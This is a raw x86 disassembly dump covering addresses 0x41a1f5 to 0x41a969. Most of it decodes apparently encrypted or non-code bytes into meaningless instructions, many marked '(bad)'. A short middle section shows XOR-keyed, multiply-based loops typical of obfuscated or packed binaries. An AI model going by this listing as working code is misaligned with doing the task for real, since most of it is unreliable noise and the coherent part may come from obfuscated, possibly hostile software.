  41a1f5:	mov    eax,0x85bb676
  41a1fa:	xor    al,0x92
  41a1fc:	inc    eax
  41a1fd:	dec    esi
  41a1fe:	jmp    0xa030:0x7413af80
  41a205:	loopne 0x41a1ea
  41a207:	ins    DWORD PTR es:[edi],dx
  41a208:	push   cs
  41a209:	(bad)  
  41a20a:	in     eax,dx
  41a20b:	mov    eax,0x622c9358
  41a210:	xor    DWORD PTR [ebx-0x6e216bd7],0xdcfc4350
  41a21a:	(bad)  
  41a21b:	xchg   ebp,eax
  41a21c:	icebp  
  41a21d:	icebp  
  41a21e:	aas    
  41a21f:	jmp    FWORD PTR [edi+0x2e273d2e]
  41a225:	(bad)  
  41a226:	jb     0x41a216
  41a228:	cwde   
  41a229:	mov    ecx,0xdc0c9504
  41a22e:	rcr    edi,cl
  41a230:	out    dx,eax
  41a231:	xor    BYTE PTR [edi-0x63],cl
  41a234:	add    cl,BYTE PTR [eax-0x74]
  41a237:	ins    BYTE PTR es:[edi],dx
  41a238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a239:	scas   eax,DWORD PTR es:[edi]
  41a23a:	mov    cl,0x62
  41a23c:	xor    ebp,DWORD PTR [eax+eax*4+0x1c820f8f]
  41a243:	fwait
  41a244:	sub    esi,ebx
  41a246:	ficomp DWORD PTR [esi]
  41a248:	das    
  41a249:	inc    ecx
  41a24a:	mov    bl,0x78
  41a24c:	repnz (bad) 
  41a24f:	mov    cs,WORD PTR [ebx]
  41a251:	cmp    eax,0x8de00417
  41a256:	sub    edi,eax
  41a258:	push   ebx
  41a259:	mov    edx,0x8f35e3e5
  41a25e:	mov    WORD PTR [esi+0x51f2995b],?
  41a264:	mov    cl,0x34
  41a266:	cs (bad) 
  41a268:	int3   
  41a269:	stc    
  41a26a:	test   DWORD PTR [ebx+eax*2-0x1d286b64],0xf97febb5
  41a275:	iret   
  41a276:	(bad)  
  41a277:	fstp   QWORD PTR [esi-0x53]
  41a27a:	mov    ds:0x4fcab830,eax
  41a27f:	iret   
  41a280:	pusha  
  41a281:	seta   al
  41a284:	jge    0x41a267
  41a286:	xchg   DWORD PTR es:[edx+esi*4+0x4b927a68],esi
  41a28e:	les    ebx,FWORD PTR [eax+0x33]
  41a291:	jle    0x41a2dd
  41a293:	int3   
  41a294:	mov    fs,WORD PTR [ebp-0x2e]
  41a297:	cwde   
  41a298:	cdq    
  41a299:	into   
  41a29a:	inc    esi
  41a29b:	add    al,BYTE PTR [esi-0x2dd921df]
  41a2a1:	rol    DWORD PTR [edx+edi*1-0x5d],1
  41a2a5:	popa   
  41a2a6:	cmp    BYTE PTR [ecx-0x7],al
  41a2a9:	jne    0x41a281
  41a2ab:	xchg   ebp,eax
  41a2ac:	xchg   ecx,eax
  41a2ad:	ins    DWORD PTR es:[edi],dx
  41a2ae:	stc    
  41a2af:	adc    dl,BYTE PTR [edi]
  41a2b1:	mov    ebx,0x514a91ca
  41a2b6:	(bad)  
  41a2b7:	inc    edi
  41a2b8:	jle    0x41a311
  41a2ba:	or     BYTE PTR [esi+0x1c],cl
  41a2bd:	push   ebx
  41a2be:	or     esp,ebp
  41a2c0:	stos   BYTE PTR es:[edi],al
  41a2c1:	mov    bl,0x6a
  41a2c3:	adc    DWORD PTR [ebx],esi
  41a2c5:	into   
  41a2c6:	fwait
  41a2c7:	push   0x25
  41a2c9:	xor    edi,0x3c7c7475
  41a2cf:	in     eax,0xda
  41a2d1:	mov    ch,0x4c
  41a2d3:	data16 xor BYTE PTR [ebp-0x7b07ce70],al
  41a2da:	aas    
  41a2db:	int    0x34
  41a2dd:	add    al,0xfb
  41a2df:	loope  0x41a267
  41a2e1:	repnz stos DWORD PTR es:[edi],eax
  41a2e3:	sbb    al,0x2d
  41a2e5:	ds cwde 
  41a2e7:	scas   eax,DWORD PTR es:[edi]
  41a2e8:	ins    BYTE PTR es:[edi],dx
  41a2e9:	test   DWORD PTR [ebx],edi
  41a2eb:	sbb    DWORD PTR [edi+ebp*2],edi
  41a2ee:	loopne 0x41a2c8
  41a2f0:	and    al,0x3a
  41a2f2:	dec    ecx
  41a2f3:	inc    esp
  41a2f4:	pop    ds
  41a2f5:	retf   0x4e9f
  41a2f8:	add    ecx,edi
  41a2fa:	xchg   ebx,edi
  41a2fc:	ds in  al,0x4b
  41a2ff:	ret    0xd0e1
  41a302:	enter  0xe7d0,0x64
  41a306:	inc    eax
  41a307:	xor    dh,BYTE PTR [ebx+0x5fd10712]
  41a30d:	arpl   WORD PTR [eax+0x2f],ax
  41a310:	test   al,0x83
  41a312:	sahf   
  41a313:	push   edx
  41a314:	jnp    0x41a33b
  41a316:	and    DWORD PTR [esi+0x9],edi
  41a319:	clc    
  41a31a:	adc    DWORD PTR [esp+ebx*2],0xc056a0e3
  41a321:	jg     0x41a2d9
  41a323:	pop    ecx
  41a324:	idiv   DWORD PTR ds:0xf246b1a4
  41a32a:	cmp    DWORD PTR [edx+ecx*8],esi
  41a32d:	lds    ecx,FWORD PTR [ebp-0x2]
  41a330:	pop    eax
  41a331:	sbb    cl,BYTE PTR ds:0xe6915df7
  41a337:	pop    ss
  41a338:	mov    dl,0x89
  41a33a:	ins    DWORD PTR es:[edi],dx
  41a33b:	in     al,dx
  41a33c:	test   al,0x7
  41a33e:	mov    cl,0xaa
  41a340:	retf   
  41a341:	mov    ds:0xeb21b092,al
  41a346:	nop
  41a347:	daa    
  41a348:	mov    DWORD PTR [esi],ebx
  41a34a:	ins    BYTE PTR es:[edi],dx
  41a34b:	push   es
  41a34c:	xchg   BYTE PTR [edi],al
  41a34e:	imul   eax,DWORD PTR ds:0xd7ffba2d,0xd2062776
  41a358:	cmp    BYTE PTR [ebx-0x51674ce5],dh
  41a35e:	xchg   ecx,eax
  41a35f:	push   ds
  41a360:	mov    ebx,0xb3f4144b
  41a365:	fnstcw WORD PTR [esp+ebp*8-0x7d]
  41a369:	push   edx
  41a36a:	xor    eax,0xbd9a6fbc
  41a36f:	bswap  edx
  41a371:	push   ds
  41a372:	gs out dx,eax
  41a374:	add    cl,BYTE PTR [edx]
  41a376:	inc    edx
  41a377:	(bad)  
  41a378:	push   ss
  41a379:	inc    ebp
  41a37a:	lods   eax,DWORD PTR ds:[esi]
  41a37b:	mov    eax,ds:0x366cbd
  41a380:	cmp    eax,esi
  41a382:	mov    DWORD PTR [esi+0x49560f97],esp
  41a388:	mov    bl,0x9e
  41a38a:	pop    ds
  41a38b:	les    edx,FWORD PTR [ebx-0x27685a3e]
  41a391:	ret    0x5b7
  41a394:	pop    esp
  41a395:	dec    esp
  41a396:	or     DWORD PTR [esi-0x4a],edi
  41a399:	(bad)  
  41a39a:	pop    edx
  41a39b:	adc    al,0x10
  41a39d:	test   DWORD PTR [esi],0x44fde55f
  41a3a3:	aam    0xa8
  41a3a5:	mov    BYTE PTR [eax-0x44314aa6],bl
  41a3ab:	push   ebx
  41a3ac:	cmp    edx,edx
  41a3ae:	dec    edx
  41a3af:	add    al,BYTE PTR [esi]
  41a3b1:	fidivr DWORD PTR [edi+ecx*2]
  41a3b4:	fsubr  QWORD PTR [edi]
  41a3b6:	shr    DWORD PTR [edx-0x10],0x16
  41a3ba:	pop    edx
  41a3bb:	je     0x41a38c
  41a3bd:	out    dx,al
  41a3be:	pushf  
  41a3bf:	imul   ebx,DWORD PTR [eax-0x3c],0x63
  41a3c3:	int    0x12
  41a3c5:	pop    ds
  41a3c6:	sub    bl,bh
  41a3c8:	fsubrp st(5),st
  41a3ca:	push   edx
  41a3cb:	sbb    ah,bl
  41a3cd:	(bad)  
  41a3ce:	cmp    DWORD PTR [eax+0x598b2271],eax
  41a3d4:	or     ebp,0x190c0f92
  41a3da:	mov    edx,0x9725a401
  41a3df:	loopne 0x41a41c
  41a3e1:	jle    0x41a36d
  41a3e3:	lock or DWORD PTR ds:0xebef4d54,ecx
  41a3ea:	aam    0x43
  41a3ec:	mov    ?,edx
  41a3ee:	mov    ds:0xa8892460,eax
  41a3f3:	sub    BYTE PTR [ecx-0x5d],dl
  41a3f6:	lea    ebx,[ecx+eiz*8]
  41a3f9:	or     esp,edi
  41a3fb:	mov    ch,BYTE PTR [esi]
  41a3fd:	add    BYTE PTR [esi],ch
  41a3ff:	cmovge esi,eax
  41a402:	sbb    edx,DWORD PTR [edx+0x21bbe71c]
  41a408:	xchg   edi,eax
  41a409:	(bad)  
  41a40a:	push   cs
  41a40b:	and    BYTE PTR [edx-0x3e74fd45],cl
  41a411:	arpl   WORD PTR [esi+ebp*8],cx
  41a414:	not    bh
  41a416:	sub    BYTE PTR [ebp-0x181cc16c],dl
  41a41c:	mov    eax,0xe97d21c0
  41a421:	jae    0x41a44f
  41a423:	stc    
  41a424:	into   
  41a425:	cmp    al,0x9
  41a427:	jne    0x41a3d1
  41a429:	ins    BYTE PTR es:[edi],dx
  41a42a:	inc    edx
  41a42b:	or     DWORD PTR [ecx+0x40c32744],ecx
  41a431:	dec    ebx
  41a432:	push   cs
  41a433:	mov    cl,0xfd
  41a435:	jno    0x41a3cb
  41a437:	stc    
  41a438:	ror    DWORD PTR [ebx],1
  41a43a:	cmp    esp,edi
  41a43c:	push   ecx
  41a43d:	mov    esp,0x9690f444
  41a442:	dec    eax
  41a443:	xchg   si,ax
  41a445:	das    
  41a446:	mov    dl,0x1c
  41a448:	mov    al,ds:0xa3f8af98
  41a44d:	and    eax,esi
  41a44f:	loopne 0x41a445
  41a451:	dec    edi
  41a452:	sahf   
  41a453:	xchg   bh,al
  41a455:	dec    ebp
  41a456:	je     0x41a4a7
  41a458:	outs   dx,DWORD PTR ds:[esi]
  41a459:	fdiv   st(0),st
  41a45b:	rcl    edx,cl
  41a45d:	or     DWORD PTR [ebx],0x32ac63e
  41a463:	mov    ebx,0x50272d47
  41a468:	shr    DWORD PTR [eax],0x82
  41a46b:	jp     0x41a4ac
  41a46d:	out    0x8d,eax
  41a46f:	mov    edi,0xbe85cbc1
  41a474:	cmc    
  41a475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a476:	in     al,0x39
  41a478:	mov    al,ds:0xa7185ac2
  41a47d:	rcr    DWORD PTR [eax+0x3b4910e4],cl
  41a483:	(bad)  
  41a484:	mov    dl,BYTE PTR [ebp+0x6964d0aa]
  41a48a:	push   ss
  41a48b:	(bad)  
  41a48c:	pop    esp
  41a48d:	fiadd  DWORD PTR [ecx-0x37]
  41a490:	jne    0x41a424
  41a492:	inc    eax
  41a493:	xor    al,0x59
  41a495:	mov    esp,DWORD PTR [ebx-0x5]
  41a498:	push   ds
  41a499:	push   edi
  41a49a:	pusha  
  41a49b:	pavgw  mm6,QWORD PTR [ebp-0x78]
  41a49f:	xchg   ch,cl
  41a4a1:	jbe    0x41a42c
  41a4a3:	xchg   ebp,eax
  41a4a4:	xlat   BYTE PTR ds:[ebx]
  41a4a5:	jnp    0x41a513
  41a4a7:	mov    dl,0xd4
  41a4a9:	mov    ebx,DWORD PTR [ecx]
  41a4ab:	pop    eax
  41a4ac:	mov    eax,DWORD PTR [esp+edi*2-0x17]
  41a4b0:	sub    esp,DWORD PTR [ecx]
  41a4b2:	and    esp,0xffffffdf
  41a4b5:	aad    0x3e
  41a4b7:	pop    ebx
  41a4b8:	mov    eax,ds:0x7e1647e9
  41a4bd:	pop    ds
  41a4be:	jmp    0x3c4e6696
  41a4c3:	xor    al,0x6c
  41a4c5:	xchg   ebx,eax
  41a4c6:	mov    ?,WORD PTR [ecx+0x7553055b]
  41a4cc:	out    dx,al
  41a4cd:	(bad)  
  41a4ce:	jp     0x41a49d
  41a4d0:	add    BYTE PTR [esi+0x98361bd],ch
  41a4d6:	add    al,0x42
  41a4d8:	leave  
  41a4d9:	iret   
  41a4da:	cmp    al,ch
  41a4dc:	int3   
  41a4dd:	pushf  
  41a4de:	jge    0x41a4b5
  41a4e0:	xchg   esp,eax
  41a4e1:	mov    eax,ds:0xc12086e8
  41a4e6:	push   cs
  41a4e7:	or     eax,0xeafea781
  41a4ec:	fs cld 
  41a4ee:	adc    al,0x38
  41a4f0:	pop    eax
  41a4f1:	rcr    DWORD PTR [ecx-0x3f],cl
  41a4f4:	pop    eax
  41a4f5:	jmp    0x5c0f:0x54d332c2
  41a4fc:	xor    BYTE PTR [ecx-0x2eadb27f],al
  41a502:	out    0xbb,al
  41a504:	sub    BYTE PTR [eax],0x8f
  41a507:	inc    esp
  41a508:	in     al,0x5c
  41a50a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a50b:	ja     0x41a540
  41a50d:	and    ebp,DWORD PTR [ecx-0x7e796c22]
  41a513:	xchg   DWORD PTR [eax*8+0x261c99a4],edx
  41a51a:	adc    BYTE PTR ds:0xbd8f89ba,0xd3
  41a521:	ja     0x41a590
  41a523:	mov    ds:0xa51a5448,eax
  41a528:	jns    0x41a504
  41a52a:	jno    0x41a576
  41a52c:	cld    
  41a52d:	stos   BYTE PTR es:[edi],al
  41a52e:	push   cs
  41a52f:	pushf  
  41a530:	xchg   ecx,eax
  41a531:	lds    ebp,FWORD PTR [ebx-0x33]
  41a534:	pop    esi
  41a535:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a537:	clc    
  41a538:	push   ebx
  41a539:	(bad)  
  41a53a:	sti    
  41a53b:	jne    0x41a4ef
  41a53d:	test   al,0xe3
  41a53f:	loopne 0x41a4f9
  41a541:	jle    0x41a50a
  41a543:	cli    
  41a544:	cmp    eax,0x9a93af1f
  41a549:	in     al,dx
  41a54a:	push   ebp
  41a54b:	aam    0x42
  41a54d:	ror    BYTE PTR [ecx],cl
  41a54f:	pop    edx
  41a550:	ins    BYTE PTR es:[edi],dx
  41a551:	fistp  QWORD PTR [ecx+0x15]
  41a554:	out    0x8d,al
  41a556:	xor    cl,BYTE PTR [ebx-0x3a17a350]
  41a55c:	lods   al,BYTE PTR ds:[esi]
  41a55d:	mov    esi,0x80dc0233
  41a562:	std    
  41a563:	cwd    
  41a565:	add    eax,0xfca28d1a
  41a56a:	aad    0x56
  41a56c:	mov    ds:0xdffb9685,eax
  41a571:	pusha  
  41a572:	(bad)  
  41a573:	leave  
  41a574:	sub    al,0x26
  41a576:	shr    BYTE PTR [edi+0x1412aecd],cl
  41a57c:	lds    edi,FWORD PTR [si]
  41a57f:	mov    ecx,DWORD PTR [esi+ecx*4]
  41a582:	(bad)
  41a585:	clc    
  41a586:	push   ecx
  41a587:	sub    DWORD PTR [edx-0x5a572d94],0x1
  41a58e:	inc    esp
  41a58f:	push   ebp
  41a590:	xchg   ebx,eax
  41a591:	aas    
  41a592:	jmp    0x795a2b4e
  41a597:	mov    BYTE PTR [ebx+0x46],bl
  41a59a:	inc    BYTE PTR [ebx+eiz*4+0x513ddcc8]
  41a5a1:	pop    ds
  41a5a2:	fst    QWORD PTR [ecx]
  41a5a4:	lods   eax,DWORD PTR ds:[si]
  41a5a6:	sbb    ebp,DWORD PTR [ebx+0x70]
  41a5a9:	popa   
  41a5aa:	or     ch,BYTE PTR [ebp+0x4bc1be15]
  41a5b0:	int3   
  41a5b1:	xor    al,0xfd
  41a5b3:	or     al,0x27
  41a5b5:	pop    es
  41a5b6:	pop    ss
  41a5b7:	mov    dl,0xb7
  41a5b9:	inc    esp
  41a5ba:	sub    DWORD PTR [edx+0x40],0xd5a19b6
  41a5c1:	xchg   al,bl
  41a5c3:	hlt    
  41a5c4:	adc    al,0x2e
  41a5c6:	iret   
  41a5c7:	loop   0x41a622
  41a5c9:	shr    DWORD PTR [ebx-0x2b36ccbc],0x8f
  41a5d0:	fistp  WORD PTR [eax]
  41a5d2:	jns    0x41a63b
  41a5d4:	in     al,dx
  41a5d5:	jb     0x41a57c
  41a5d7:	(bad)  
  41a5d8:	ficomp WORD PTR [ecx-0x44]
  41a5db:	cs xchg ebx,eax
  41a5dd:	inc    ecx
  41a5de:	xchg   esi,eax
  41a5df:	jae    0x41a56a
  41a5e1:	and    ebp,DWORD PTR [edx+eiz*1-0x69582f13]
  41a5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5e9:	lods   al,BYTE PTR ds:[esi]
  41a5ea:	add    BYTE PTR [esp+ebp*8],cl
  41a5ed:	sahf   
  41a5ee:	imul   eax,DWORD PTR [eax],0x757e4e66
  41a5f4:	adc    DWORD PTR [ecx+0x44],0x0
  41a5f8:	mov    edx,0x9c1cee33
  41a5fd:	jp     0x41a5ce
  41a5ff:	dec    ebp
  41a600:	pop    edx
  41a601:	mov    edx,0xd7ab0540
  41a606:	std    
  41a607:	lds    eax,FWORD PTR [esi-0x1d09181f]
  41a60d:	jne    0x41a602
  41a60f:	add    DWORD PTR [esi],0xd
  41a612:	sbb    ecx,DWORD PTR [esp+edi*1+0x1e]
  41a616:	sbb    ch,al
  41a618:	mov    ch,0x73
  41a61a:	je     0x41a60b
  41a61c:	mov    eax,ds:0xa2267703
  41a621:	dec    eax
  41a622:	in     al,dx
  41a623:	(bad)  
  41a624:	fucom  st(0)
  41a626:	nop
  41a627:	adc    eax,0x2a458e55
  41a62c:	push   es
  41a62d:	sbb    BYTE PTR [edi+edi*2-0x121bd551],bl
  41a634:	inc    edi
  41a635:	jae    0x41a641
  41a637:	xchg   ebx,eax
  41a638:	(bad)  
  41a639:	shr    DWORD PTR [edx],cl
  41a63b:	mov    cl,0xe6
  41a63d:	fist   WORD PTR [edi+0x548d96da]
  41a643:	lea    ebx,[ebx+ecx*4-0x7604cce6]
  41a64a:	cmp    cl,BYTE PTR [ebx-0x2fccf7ab]
  41a650:	inc    ecx
  41a651:	inc    DWORD PTR [ebp-0x18]
  41a654:	add    edx,esi
  41a656:	cmp    ecx,edx
  41a658:	jb     0x418297
  41a65e:	jmp    0x41a6a8
  41a663:	mov    ecx,DWORD PTR [ebp-0xc]
  41a666:	mov    DWORD PTR [ebp+0x8],ecx
  41a669:	jmp    0x41a69b
  41a66e:	mov    ecx,DWORD PTR [ebp+0x8]
  41a671:	mov    edx,DWORD PTR [ebp-0x8]
  41a674:	xor    ecx,eax
  41a676:	xor    edx,eax
  41a678:	sub    ecx,edx
  41a67a:	sub    ecx,esi
  41a67c:	xor    ecx,eax
  41a67e:	mov    DWORD PTR [ebp+0x8],ecx
  41a681:	mov    ecx,DWORD PTR [ebp+0x8]
  41a684:	mov    edx,DWORD PTR [ebp+0x8]
  41a687:	imul   edx,edx,0x5708f9
  41a68d:	xor    ecx,eax
  41a68f:	add    ecx,esi
  41a691:	lea    ecx,[ebp+ecx*4-0x64]
  41a695:	mov    edi,DWORD PTR [ecx]
  41a697:	add    edx,edi
  41a699:	mov    DWORD PTR [ecx],edx
  41a69b:	mov    ecx,DWORD PTR [ebp+0x8]
  41a69e:	xor    ecx,eax
  41a6a0:	add    ecx,esi
  41a6a2:	jne    0x41a66e
  41a6a8:	mov    ecx,DWORD PTR [ebp-0xc]
  41a6ab:	mov    DWORD PTR [ebp+0x8],ecx
  41a6ae:	jmp    0x41a6e0
  41a6b3:	mov    ecx,DWORD PTR [ebp+0x8]
  41a6b6:	mov    edx,DWORD PTR [ebp-0x8]
  41a6b9:	xor    ecx,eax
  41a6bb:	xor    edx,eax
  41a6bd:	sub    ecx,edx
  41a6bf:	sub    ecx,esi
  41a6c1:	xor    ecx,eax
  41a6c3:	mov    DWORD PTR [ebp+0x8],ecx
  41a6c6:	mov    ecx,DWORD PTR [ebp+0x8]
  41a6c9:	mov    edx,DWORD PTR [ebp+0x8]
  41a6cc:	imul   edx,edx,0x5708f9
  41a6d2:	xor    ecx,eax
  41a6d4:	add    ecx,esi
  41a6d6:	lea    ecx,[ebp+ecx*4-0x64]
  41a6da:	mov    edi,DWORD PTR [ecx]
  41a6dc:	add    edx,edi
  41a6de:	mov    DWORD PTR [ecx],edx
  41a6e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a6e3:	xor    ecx,eax
  41a6e5:	add    ecx,esi
  41a6e7:	jne    0x41a6b3
  41a6ed:	mov    ecx,DWORD PTR [ebp-0x8]
  41a6f0:	mov    edx,DWORD PTR [ebp-0x20]
  41a6f3:	xor    ecx,eax
  41a6f5:	lea    ecx,[ecx+edx*1+0x3272d9]
  41a6fc:	mov    DWORD PTR [ebp-0x20],ecx
  41a6ff:	inc    DWORD PTR [ebp+0xc]
  41a702:	mov    ecx,DWORD PTR [ebp-0x1c]
  41a705:	xor    ecx,eax
  41a707:	add    ecx,esi
  41a709:	jne    0x415dcf
  41a70f:	jmp    0x41a798
  41a714:	mov    ecx,DWORD PTR [ebp-0xc]
  41a717:	mov    DWORD PTR [ebp+0x8],ecx
  41a71a:	jmp    0x41a74c
  41a71f:	mov    ecx,DWORD PTR [ebp+0x8]
  41a722:	mov    edx,DWORD PTR [ebp-0x8]
  41a725:	xor    ecx,eax
  41a727:	xor    edx,eax
  41a729:	sub    ecx,edx
  41a72b:	sub    ecx,esi
  41a72d:	xor    ecx,eax
  41a72f:	mov    DWORD PTR [ebp+0x8],ecx
  41a732:	mov    ecx,DWORD PTR [ebp+0x8]
  41a735:	mov    edx,DWORD PTR [ebp+0x8]
  41a738:	imul   edx,edx,0x5708f9
  41a73e:	xor    ecx,eax
  41a740:	add    ecx,esi
  41a742:	lea    ecx,[ebp+ecx*4-0x64]
  41a746:	mov    edi,DWORD PTR [ecx]
  41a748:	add    edx,edi
  41a74a:	mov    DWORD PTR [ecx],edx
  41a74c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a74f:	xor    ecx,eax
  41a751:	add    ecx,esi
  41a753:	jne    0x41a71f
  41a759:	jmp    0x41a7a4
  41a75e:	mov    ecx,DWORD PTR [ebp+0x8]
  41a761:	mov    edx,DWORD PTR [ebp-0x8]
  41a764:	xor    ecx,eax
  41a766:	xor    edx,eax
  41a768:	sub    ecx,edx
  41a76a:	sub    ecx,esi
  41a76c:	xor    ecx,eax
  41a76e:	mov    DWORD PTR [ebp+0x8],ecx
  41a771:	mov    ecx,DWORD PTR [ebp+0x8]
  41a774:	mov    edx,DWORD PTR [ebp+0x8]
  41a777:	xor    ecx,eax
  41a779:	imul   edx,edx,0x5708f9
  41a77f:	add    ecx,esi
  41a781:	lea    ecx,[ebp+ecx*4-0x64]
  41a785:	mov    edi,DWORD PTR [ecx]
  41a787:	add    edx,edi
  41a789:	mov    DWORD PTR [ecx],edx
  41a78b:	mov    ecx,DWORD PTR [ebp+0x8]
  41a78e:	xor    ecx,eax
  41a790:	add    ecx,esi
  41a792:	jne    0x41a75e
  41a798:	mov    ecx,DWORD PTR [ebp-0x8]
  41a79b:	xor    ecx,eax
  41a79d:	mov    eax,DWORD PTR [ebp+0x10]
  41a7a0:	add    ecx,esi
  41a7a2:	mov    DWORD PTR [eax],ecx
  41a7a4:	pop    edi
  41a7a5:	pop    esi
  41a7a6:	pop    ebx
  41a7a7:	leave  
  41a7a8:	ret    0xc
  41a7ab:	dec    ecx
  41a7ac:	jle    0x41a804
  41a7ae:	imul   esi,DWORD PTR [edi+0x6b],0x7d
  41a7b2:	jle    0x41a82b
  41a7b4:	ret    0xcf9
  41a7b7:	sub    cl,BYTE PTR [ebx+0x4c]
  41a7ba:	hlt    
  41a7bb:	lods   eax,DWORD PTR ds:[esi]
  41a7bc:	popa   
  41a7bd:	add    DWORD PTR [eax],eax
  41a7bf:	sub    eax,DWORD PTR [edx]
  41a7c1:	add    BYTE PTR [eax],al
  41a7c3:	lock fadd DWORD PTR [ebx+0x388efaba]
  41a7ca:	rol    BYTE PTR [esi-0x3661ba7],1
  41a7d0:	push   cs
  41a7d1:	(bad)  
  41a7d2:	fucompp 
  41a7d4:	mov    dh,0x90
  41a7d6:	sbb    DWORD PTR [edx-0x66683f8a],0x5f04c878
  41a7e0:	lods   al,BYTE PTR ds:[esi]
  41a7e1:	fld    TBYTE PTR [ecx+0x58]
  41a7e4:	jmp    0x41a7db
  41a7e6:	lahf   
  41a7e7:	and    eax,0xa18015f9
  41a7ec:	out    dx,eax
  41a7ed:	push   eax
  41a7ee:	xchg   DWORD PTR [edi-0xe],ebp
  41a7f1:	(bad)  
  41a7f2:	ds mov al,0x64
  41a7f5:	sbb    DWORD PTR [eax-0x32ee178a],ecx
  41a7fb:	dec    eax
  41a7fc:	pop    esp
  41a7fd:	(bad)  
  41a7fe:	adc    al,0x99
  41a800:	fisub  DWORD PTR [ebx+0x1fab9fae]
  41a806:	xor    al,0x4e
  41a808:	sbb    BYTE PTR [ebx],ch
  41a80a:	push   ds
  41a80b:	enter  0x935b,0x79
  41a80f:	sub    bh,dh
  41a811:	cmp    BYTE PTR [edi+0x781182e0],bl
  41a817:	int3   
  41a818:	sub    BYTE PTR [ebp-0x6f6045e1],bh
  41a81e:	xchg   esp,eax
  41a81f:	adc    ah,BYTE PTR [esi]
  41a821:	outs   dx,BYTE PTR ds:[esi]
  41a822:	fistp  QWORD PTR [eax*4-0x15ea0420]
  41a829:	fild   WORD PTR [ebx+0x57]
  41a82c:	out    dx,al
  41a82d:	ja     0x41a884
  41a82f:	sbb    BYTE PTR [edx+0x62],bl
  41a832:	pop    ss
  41a833:	add    ch,0xce
  41a836:	clc    
  41a837:	jns    0x41a85a
  41a839:	dec    esp
  41a83a:	and    BYTE PTR [ebx+0xe],bh
  41a83d:	in     eax,dx
  41a83e:	jp     0x41a7ed
  41a840:	jp     0x41a7e8
  41a842:	inc    edx
  41a843:	sub    eax,0xcaa4b58c
  41a848:	mov    edi,0x3679a579
  41a84d:	fs ss xchg esi,eax
  41a850:	dec    ebx
  41a851:	test   al,0x84
  41a853:	(bad)  
  41a854:	mov    ch,0x5c
  41a856:	ret    
  41a857:	test   DWORD PTR [edx],edx
  41a859:	sbb    ebx,DWORD PTR [eax+eax*1+0x2d]
  41a85d:	scas   al,BYTE PTR es:[edi]
  41a85e:	dec    esi
  41a85f:	ds mov cl,0x24
  41a862:	sbb    BYTE PTR [eax],bl
  41a864:	out    dx,eax
  41a865:	push   ds
  41a866:	(bad)  
  41a867:	rcl    ah,1
  41a869:	or     edx,DWORD PTR [edx]
  41a86b:	dec    esp
  41a86c:	test   al,0xd3
  41a86e:	std    
  41a86f:	mov    edx,DWORD PTR [ecx+0x7428ad94]
  41a875:	sbb    ah,BYTE PTR [esi+0x1d]
  41a878:	cmp    al,0x7b
  41a87a:	push   esi
  41a87b:	xor    DWORD PTR [ebx],esp
  41a87d:	enter  0x5349,0xfd
  41a881:	or     BYTE PTR [edi],bl
  41a883:	pushf  
  41a884:	push   edx
  41a885:	mov    ds:0x2ea6f3d9,eax
  41a88a:	(bad)
  41a88e:	imul   BYTE PTR [ecx-0x20]
  41a891:	add    eax,0x2b2c0f47
  41a896:	iret   
  41a897:	jb     0x41a84f
  41a899:	push   ebx
  41a89a:	fcmovne st,st(1)
  41a89c:	push   ebx
  41a89d:	sbb    eax,0x7c2b6382
  41a8a2:	cmp    BYTE PTR [edi+0x2f947fd4],ah
  41a8a8:	cli    
  41a8a9:	daa    
  41a8aa:	mov    WORD PTR [ebp+0x0],es
  41a8ad:	mov    esp,DWORD PTR [ebx+0x3f0b8ad7]
  41a8b3:	retf   0xf75f
  41a8b6:	add    al,0xa
  41a8b8:	ss inc edx
  41a8ba:	push   edx
  41a8bb:	or     bl,BYTE PTR [edi]
  41a8bd:	loop   0x41a869
  41a8bf:	jp     0x41a8f4
  41a8c1:	pop    esp
  41a8c2:	pop    ss
  41a8c3:	loope  0x41a8fa
  41a8c5:	int3   
  41a8c6:	out    0x13,al
  41a8c8:	iret   
  41a8c9:	xor    BYTE PTR [eax+edi*8+0x4c],ah
  41a8cd:	pop    esi
  41a8ce:	(bad)  
  41a8cf:	adc    ch,al
  41a8d1:	jmp    0xc9a3f79
  41a8d6:	pusha  
  41a8d7:	retf   0x3884
  41a8da:	mov    dl,0x0
  41a8dc:	dec    esi
  41a8dd:	test   BYTE PTR [esi+0x557cf391],bh
  41a8e3:	inc    ecx
  41a8e4:	mov    al,ds:0x95e73c
  41a8e9:	rcl    DWORD PTR [ebp-0x2766456b],cl
  41a8ef:	call   0xdee5:0x3a0af9a0
  41a8f6:	popa   
  41a8f7:	sub    BYTE PTR gs:[edx+0x32502fc5],ah
  41a8fe:	sub    DWORD PTR [esi+0x74],esp
  41a901:	cwde   
  41a902:	and    ch,dh
  41a904:	push   esi
  41a905:	js     0x41a892
  41a907:	aam    0xe4
  41a909:	inc    eax
  41a90a:	jmp    0x41a923
  41a90c:	popa   
  41a90d:	int    0x93
  41a90f:	dec    ebx
  41a910:	popaw  
  41a912:	sub    cl,BYTE PTR [esi+0x72b7dc83]
  41a918:	loop   0x41a978
  41a91a:	leave  
  41a91b:	push   eax
  41a91c:	idiv   BYTE PTR [eax+ecx*2+0x5ac07371]
  41a923:	cmp    eax,0x49894825
  41a928:	in     eax,0x1b
  41a92a:	div    DWORD PTR [eax+0x3b]
  41a92d:	add    eax,0xe3fe9d8b
  41a932:	xor    eax,DWORD PTR [ecx-0x3406286b]
  41a938:	or     ebp,DWORD PTR [edx+ebx*1]
  41a93b:	or     DWORD PTR [eax+0x552c9932],edi
  41a941:	outs   dx,BYTE PTR ds:[esi]
  41a942:	daa    
  41a943:	or     BYTE PTR [esi+0x7e],ah
  41a946:	cdq    
  41a947:	mov    ds:0xf622558f,eax
  41a94c:	fist   DWORD PTR [edx]
  41a94e:	add    al,dh
  41a950:	sbb    al,0xf2
  41a952:	push   ss
  41a953:	out    dx,al
  41a954:	inc    esp
  41a955:	xlat   BYTE PTR ds:[ebx]
  41a956:	loop   0x41a938
  41a958:	mov    WORD PTR [ecx+0x3e],cs
  41a95b:	inc    ebp
  41a95c:	or     BYTE PTR [eax+0x77],ch
  41a95f:	push   0x3dc1709c
  41a964:	(bad)  
  41a965:	jge    0x41a964
  41a967:	(bad)  
  41a969:	xor    ah,BYTE PTR [edx]
